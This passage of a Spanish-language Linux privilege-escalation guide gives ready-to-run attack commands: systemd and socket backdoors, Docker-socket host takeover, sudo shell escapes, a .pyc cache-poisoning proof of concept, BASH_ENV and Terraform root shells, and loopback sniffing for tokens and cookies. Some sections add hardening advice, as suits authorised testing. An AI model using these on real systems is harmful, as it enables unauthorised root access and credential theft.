Comprueba si puedes escribir en algún archivo `.service`; si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, **reinicie** o **detenga** (quizá tengas que esperar hasta que se reinicie la máquina).\
Por ejemplo, crea tu backdoor dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicios modificables

Ten en cuenta que, si tienes **permisos de escritura sobre los binarios que ejecutan los servicios**, puedes reemplazarlos por backdoors para que estas se ejecuten cuando se vuelvan a ejecutar los servicios.

### PATH de systemd - Rutas relativas

Puedes ver el PATH que usa **systemd** con:

```bash
systemctl show-environment
```

Si descubres que puedes **escribir** en cualquiera de las carpetas de la ruta, quizá puedas **escalar privilegios**. Debes buscar **rutas relativas utilizadas en archivos de configuración de servicios**, como:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Luego, crea un **ejecutable** con el **mismo nombre que el binario de la ruta relativa** dentro de una carpeta del PATH de systemd en la que puedas escribir. Cuando se le solicite al servicio que ejecute la acción vulnerable (**Start**, **Stop**, **Reload**), se ejecutará tu **backdoor** (por lo general, los usuarios sin privilegios no pueden iniciar ni detener servicios, pero comprueba si puedes usar `sudo -l`).

**Puedes obtener más información sobre los servicios con `man systemd.service`.**

## **Temporizadores**

Los **temporizadores** son archivos de unidad de systemd cuyos nombres terminan en **.timer** y que controlan archivos **.service** o eventos. Se pueden usar como alternativa a cron, ya que admiten eventos programados según el calendario y eventos de tiempo monotónico, y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los temporizadores con:

```bash
systemctl list-timers --all
```

### Timers modificables

Si puedes modificar un timer, puedes hacer que ejecute algunas unidades de systemd.unit (como un `.service` o un `.target`)

```bash
Unit=backdoor.service
```

En la documentación puedes leer qué es la unidad:

> La unidad que se activa cuando transcurre este temporizador. El argumento es el nombre de una unidad, cuyo sufijo no es «.timer». Si no se especifica, este valor toma por defecto el nombre de un servicio que coincide con el de la unidad del temporizador, salvo por el sufijo. (Consulta lo anterior). Se recomienda que el nombre de la unidad que se activa y el de la unidad del temporizador sean idénticos, salvo por el sufijo.

Por lo tanto, para abusar de este permiso tendrías que:

- Encontrar alguna unidad de systemd (como un `.service`) que **ejecute un binario modificable**
- Encontrar alguna unidad de systemd que **ejecute una ruta relativa** y tener **privilegios de escritura** sobre el **PATH de systemd** (para suplantar ese ejecutable)

**Obtén más información sobre los temporizadores con `man systemd.timer`.**

### **Habilitar el temporizador**

Para habilitar un temporizador necesitas privilegios de root y ejecutar:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Ten en cuenta que el **timer** se **activa** creando un enlace simbólico a él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Los Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma máquina o en máquinas diferentes mediante modelos cliente-servidor. Utilizan archivos descriptores estándar de Unix para la comunicación entre equipos y se configuran mediante archivos `.socket`.<sup>[[14]](#references)</sup>

Los sockets se pueden configurar mediante archivos `.socket`.

**Obtén más información sobre sockets con `man systemd.socket`.** En este archivo se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero en resumen **indican dónde va a escuchar** el socket (la ruta del archivo de socket AF_UNIX, la dirección IPv4/6 y/o el número de puerto donde escuchar, etc.).
- `Accept`: Acepta un argumento booleano. Si es **true**, se **inicia una instancia del servicio por cada conexión entrante** y solo se le pasa el socket de conexión. Si es **false**, los propios sockets de escucha **se pasan a la unidad de servicio iniciada**, y se inicia una sola unidad de servicio para todas las conexiones. Este valor se ignora en el caso de los sockets datagrama y las FIFO, donde una única unidad de servicio gestiona incondicionalmente todo el tráfico entrante. **El valor predeterminado es false**. Por motivos de rendimiento, se recomienda escribir los daemons nuevos de forma que sean compatibles con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceptan una o más líneas de comandos, que se **ejecutan antes** o **después** de que los **sockets**/FIFO de escucha se **creen** y se asocien, respectivamente. El primer elemento de la línea de comandos debe ser un nombre de archivo absoluto, seguido de los argumentos del proceso.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFO de escucha se **cierren** y eliminen, respectivamente.
- `Service`: Especifica el nombre de la unidad de **servicio que se va a activar** ante **tráfico entrante**. Esta opción solo está permitida para sockets con Accept=no. De forma predeterminada, se usa el servicio que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Archivos .socket con permisos de escritura

Si encuentras un archivo `.socket` con **permisos de escritura**, puedes **añadir** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y la backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente tendrás que esperar a que se reinicie la máquina.**\
_Ten en cuenta que el sistema debe estar usando la configuración de ese archivo socket o la backdoor no se ejecutará_

### Activación de sockets + ruta de unidad con permisos de escritura (crear un servicio que falta)

Otra configuración incorrecta de gran impacto es:

- una unidad de socket con `Accept=no` y `Service=<name>.service`
- falta la unidad de servicio referenciada
- un atacante puede escribir en `/etc/systemd/system` (u otra ruta de búsqueda de unidades)

En ese caso, el atacante puede crear `<name>.service` y, después, generar tráfico al socket para que systemd cargue y ejecute el nuevo servicio como root.

Flujo rápido:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets con permisos de escritura

Si **identificas algún socket con permisos de escritura** (_ahora hablamos de Unix Sockets y no de los archivos `.socket` de configuración_), **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerar Unix Sockets

```bash
netstat -a -p --unix
```

### Conexión raw

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Ejemplo de explotación:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Ten en cuenta que puede haber algunos **sockets a la escucha de solicitudes HTTP** (_no me refiero a archivos .socket, sino a archivos que actúan como sockets Unix_). Puedes comprobarlo con:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Si el socket **responde con una solicitud HTTP**, puedes **comunicarte** con él y quizá **explotar alguna vulnerabilidad**.

### Docker Socket con permisos de escritura

El socket de Docker, que suele encontrarse en `/var/run/docker.sock`, es un archivo crítico que debe protegerse. De forma predeterminada, el usuario `root` y los miembros del grupo `docker` pueden escribir en él. Tener acceso de escritura a este socket puede provocar una escalada de privilegios. A continuación se explica cómo hacerlo y se presentan métodos alternativos para cuando no esté disponible Docker CLI.

#### **Escalada de privilegios con Docker CLI**

Si tienes acceso de escritura al socket de Docker, puedes escalar privilegios con los siguientes comandos:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Estos comandos permiten ejecutar un contenedor con acceso de nivel root al sistema de archivos del host.

#### **Usando la API de Docker directamente**

En los casos en que la CLI de Docker no esté disponible, aún se puede abusar del socket de Docker mediante HTTP sin procesar sobre el socket Unix. El flujo más confiable es:

- crear un contenedor auxiliar de larga duración con el directorio raíz del host montado mediante bind
- iniciarlo
- crear una instancia de `exec` dentro de ese contenedor auxiliar
- iniciar la instancia de `exec` y leer la salida a través de la API

**Listar imágenes de Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Crear e iniciar un contenedor auxiliar**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Crea una instancia exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Inicia la instancia de exec y lee la salida**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Este patrón suele ser más robusto que intentar ejecutar `attach` manualmente con `socat` o `nc -U`. Una vez que puedes crear un helper con `/:/host`, puedes usar instancias adicionales de `exec` para leer archivos como `/host/root/...`, añadir claves SSH en `/host/root/.ssh` o modificar archivos de inicio del host.

### Otros

Ten en cuenta que, si tienes permisos de escritura en el socket de docker porque estás **dentro del grupo `docker`**, tienes [**más formas de escalar privilegios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si la [**API de docker está escuchando en un puerto**, también puedes llegar a comprometerla](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de contenedores o abusar de los runtimes de contenedores para escalar privilegios** en:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalada de privilegios con Containerd (ctr)

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página, ya que **es posible que puedas abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalada de privilegios con **RunC**

Si descubres que puedes usar el comando **`runc`**, lee la siguiente página, ya que **es posible que puedas abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado **sistema de comunicación entre procesos (IPC)** que permite a las aplicaciones interactuar e intercambiar datos de forma eficiente. Diseñado pensando en los sistemas Linux modernos, ofrece un framework robusto para distintas formas de comunicación entre aplicaciones.<sup>[[16]](#references)</sup>

El sistema es versátil: admite IPC básico que mejora el intercambio de datos entre procesos, de forma similar a los **sockets de dominio UNIX mejorados**. Además, ayuda a difundir eventos o señales, lo que facilita la integración entre los componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth que indique una llamada entrante puede hacer que un reproductor de música silencie el audio, mejorando así la experiencia del usuario. D-Bus también admite un sistema de objetos remotos que simplifica las solicitudes de servicios y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus funciona con un **modelo de permitir/denegar** que gestiona los permisos de los mensajes (llamadas a métodos, emisiones de señales, etc.) según el efecto acumulado de las reglas de política coincidentes. Estas políticas especifican las interacciones con el bus y pueden permitir la escalada de privilegios mediante la explotación de estos permisos.

A continuación se muestra un ejemplo de una política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, que detalla los permisos del usuario root para ser propietario de `fi.w1.wpa_supplicant1`, enviarle mensajes y recibirlos.

Las políticas que no especifican un usuario o grupo se aplican de forma universal, mientras que las políticas de contexto "default" se aplican a todos los casos que no estén cubiertos por otras políticas específicas.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Aprende aquí cómo enumerar y explotar una comunicación D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y averiguar cuál es la posición de la máquina.

### Enumeración genérica

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Si una entrada activa de `/etc/inetd.conf` ejecuta GNU Inetutils `telnetd` como root, comprueba la versión del binario configurado y el listener local, incluso si el puerto está enlazado solo a loopback. GNU Inetutils de la versión 1.9.3 a la 2.7 tenía un [bypass de autenticación de telnet](https://seclists.org/oss-sec/2026/q1/89) por el que el `USER` proporcionado por el cliente llegaba a `login -f` (CVE-2026-24061). Un proceso o una cadena de versión son indicios; confirma el estado de los parches del proveedor y cuál es el daemon real antes de considerarlo vulnerable. La [guía de Telnet](../../../network-services-pentesting/pentesting-telnet.md) ofrece más detalles.

### Triaje rápido del filtrado de salida

Si el host puede ejecutar comandos, pero fallan los callbacks, separa rápidamente el filtrado de DNS, transporte, proxy y rutas:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Puertos abiertos

Comprueba siempre los servicios de red que se ejecutan en la máquina y con los que no pudiste interactuar antes de acceder a ella:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Clasifica los listeners según la dirección de bind:

- `0.0.0.0` / `[::]`: expuestos en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo locales (buenos candidatos para tunnel/forward).
- IP internas específicas (p. ej., `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalmente solo accesibles desde segmentos internos.

### Flujo de triaje de servicios solo locales

Cuando comprometes un host, los servicios enlazados a `127.0.0.1` suelen volverse accesibles por primera vez desde tu shell. Un flujo local rápido es:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS como escáner de red (modo solo red)

Además de las comprobaciones locales de PE, linPEAS puede ejecutarse como un escáner de red especializado. Utiliza los binarios disponibles en `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un escáner de red puro (omite el resto de las comprobaciones de escalada de privilegios).

### Sniffing

Comprueba si puedes sniffear el tráfico. Si puedes, podrías obtener algunas credenciales.

```
timeout 1 tcpdump
```

Comprobaciones prácticas rápidas:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) es especialmente valioso en post-exploitation porque muchos servicios accesibles solo internamente exponen tokens/cookies/credenciales allí:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Captura ahora, analiza después:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Users

### Generic Enumeration

Comprueba **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en el sistema, cuáles pueden **login** y cuáles tienen **privilegios de root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID grande

Algunas versiones de Linux se vieron afectadas por un bug que permite a usuarios con **UID > INT_MAX** escalar privilegios. Más información: [aquí](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aquí](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [aquí](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Explótalo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Comprueba si eres **miembro de algún grupo** que pueda otorgarte privilegios de root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Portapapeles

Comprueba si hay algo interesante en el portapapeles (si es posible)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Política de contraseñas

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno, **intenta iniciar sesión como cada usuario** usando esa contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer brute-force a los usuarios con [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta hacer brute-force a los usuarios.

## Abusos de PATH escribible

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta de $PATH**, quizás puedas escalar privilegios **creando una backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ejecutar otro usuario (idealmente root) y que **no se cargue desde una carpeta ubicada antes que la tuya en $PATH**.

### SUDO y SUID

Es posible que tengas permiso para ejecutar algún comando usando sudo o que tenga el bit suid. Compruébalo con:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando**.<sup>[[8]](#references)</sup> Por ejemplo:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

La configuración de Sudo podría permitir que un usuario ejecute algún comando con los privilegios de otro usuario sin conocer la contraseña.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener una shell añadiendo una clave ssh al directorio de `root` o llamando a `sh`.

```
sudo vim -c '!sh'
```

### Comparación sin comillas de Bash en un script de sudo

En Bash, el lado derecho de `[[ "$protected" == $candidate ]]` es un patrón. Si un script de sudo con capacidad de ejecutarse como root asigna `candidate` a partir de un archivo controlado por quien lo invoca, un valor como `prefix*` puede coincidir con el inicio de una cadena protegida. Las distintas rutas de éxito y error podrían entonces exponer un oráculo de prefijos. Pon entre comillas el lado derecho (`[[ "$protected" == "$candidate" ]]`) cuando se pretenda una igualdad literal. Revisa los argumentos reales de sudo, la procedencia de la entrada y el comportamiento observable de las ramas antes de considerar explotable una comparación sin comillas. El [manual de GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) define este comportamiento de patrones.

### Archivos de proyecto de PrusaSlicer con sudo

Conviene revisar una concesión irrestricta de sudo con capacidad de ejecutarse como root para `prusaslicer` o `prusa-slicer` si quien la invoca puede elegir el proyecto `.3mf` que se procesa. Un proyecto puede incluir un script de posprocesamiento que se ejecuta al exportar G-code; los proyectos manipulados podrían ejecutar comandos en PrusaSlicer hasta la versión 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Confirma la regla de sudo efectiva, la versión del binario y los parches del proveedor, el origen del proyecto y si se ejecuta la ruta de exportación pertinente antes de concluir que se puede cruzar el límite de privilegios. Un argumento de proyecto fijo o una política `NOEXEC` efectiva pueden cambiar el resultado. Encontrar el slicer instalado no demuestra por sí solo que exista una vía de escalada de privilegios.

### SETENV

Esta directiva permite al usuario **definir una variable de entorno** al ejecutar algo:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Este ejemplo, **basado en la máquina Admirer de HTB**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca arbitraria de Python mientras se ejecutaba el script como root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Envenenamiento de `__pycache__` / `.pyc` escribible en imports de Python permitidos por sudo

Si un **script de Python permitido por sudo** importa un módulo cuyo directorio de paquete contiene un **`__pycache__` escribible**, quizá puedas reemplazar el `.pyc` en caché y ejecutar código como el usuario privilegiado en el siguiente import.<sup>[[30]](#references)</sup>

- Por qué funciona:
  - CPython almacena las cachés de bytecode en `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - El intérprete valida el **encabezado** (magic + metadatos de marca de tiempo/hash vinculados al código fuente) y luego ejecuta el objeto de código serializado almacenado después de ese encabezado.
  - Si puedes **eliminar y volver a crear** el archivo en caché porque el directorio es escribible, aún puedes reemplazar un `.pyc` propiedad de root y no escribible.
- Ruta típica:
  - `sudo -l` muestra un script o wrapper de Python que puedes ejecutar como root.
  - Ese script importa un módulo local desde `/opt/app/`, `/usr/local/lib/...`, etc.
  - El directorio `__pycache__` del módulo importado es escribible por tu usuario o por todos.

Enumeración rápida:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Si puedes inspeccionar el script privilegiado, identifica los módulos importados y la ruta de caché:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Flujo de abuso:

1. Ejecuta una vez el script permitido con sudo para que Python cree el archivo de cache legítimo, si aún no existe.
2. Lee los primeros 16 bytes del `.pyc` legítimo y reutilízalos en el archivo envenenado.
3. Compila un objeto de código con el payload, conviértelo con `marshal.dumps(...)`, elimina el archivo de cache original y vuelve a crearlo con la cabecera original y tu bytecode malicioso.
4. Vuelve a ejecutar el script permitido con sudo para que la importación ejecute tu payload como root.

Notas importantes:

- Reutilizar la cabecera original es clave porque Python compara los metadatos de cache con el archivo de origen, no verifica si el cuerpo del bytecode coincide realmente con el código fuente.
- Esto resulta especialmente útil cuando el archivo de origen pertenece a root y no se puede escribir en él, pero sí se puede escribir en el directorio `__pycache__` que lo contiene.
- `PYTHONDONTWRITEBYTECODE=1` y `python -B` impiden que Python escriba archivos `.pyc` nuevos; **no** impiden que cargue un archivo de cache ya válido que haya reemplazado un atacante. El límite crítico es si un usuario con menos privilegios puede reemplazar un archivo de cache que la importación privilegiada aceptará. Python comprueba los metadatos de fecha/hora y tamaño o el hash antes de cargar el bytecode almacenado en cache. Consulta la [referencia de importación de Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) y la [documentación de la línea de comandos](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Estructura mínima de prueba de concepto:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Endurecimiento:

- Asegúrate de que ningún directorio en la ruta de importación de Python con privilegios elevados tenga permisos de escritura para usuarios con pocos privilegios, incluido `__pycache__`.
- Audita la propiedad y los permisos de los directorios de caché, incluidos los archivos `.pyc` existentes. Deshabilitar la escritura de bytecode puede reducir la creación de nuevas cachés, pero no neutraliza una caché existente que se pueda reemplazar.
- Trata los módulos locales de Python y los directorios de caché con permisos de escritura igual que tratarías los scripts de shell o las bibliotecas compartidas con permisos de escritura que se ejecutan como root.

### BASH_ENV preservado mediante sudo env_keep → shell de root

Si sudoers conserva `BASH_ENV` (p. ej., `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de inicio de Bash no interactivo para ejecutar código arbitrario como root al invocar un comando permitido.<sup>[[24]](#references)</sup>

- Por qué funciona: En los shells no interactivos, Bash evalúa `$BASH_ENV` y carga ese archivo antes de ejecutar el script de destino. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si sudo conserva `BASH_ENV`, tu archivo se carga con privilegios de root.<sup>[[23]](#references)</sup>

- Requisitos:
  - Una regla de sudo que puedas ejecutar (cualquier destino que invoque `/bin/bash` de forma no interactiva, o cualquier script de bash).
  - `BASH_ENV` presente en `env_keep` (compruébalo con `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - Elimina `BASH_ENV` (y `ENV`) de `env_keep`; prefiere `env_reset`.
  - Evita shell wrappers para los comandos permitidos por sudo; usa binarios mínimos.
  - Considera el registro de E/S de sudo y las alertas cuando se usan variables de entorno preservadas.

### Terraform mediante sudo con HOME preservado (!env_reset)

Cuando sudo permite ejecutar Terraform como un usuario con más privilegios, `!env_reset` es una pista para comprobar qué variables de entorno sobreviven realmente a esa regla específica. Confirma el valor efectivo de `HOME` o `TF_CLI_CONFIG_FILE` antes de considerar que un `.terraformrc` o `terraform.rc` modificable por quien invoca el comando es la configuración CLI activa. Una entrada `provider_installation.dev_overrides` solo importa si el comando Terraform fijo carga ese provider y quien lo invoca puede colocar su ejecutable en el directorio seleccionado.<sup>[[25]](#references)</sup>

- Apunta el provider requerido a un directorio modificable y coloca un plugin malicioso con el nombre del provider (p. ej., `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform fallará el handshake del plugin de Go, pero ejecuta el payload como root antes de cerrarse, dejando una shell SUID.

### Anulación de TF_VAR + bypass de validación de symlinks

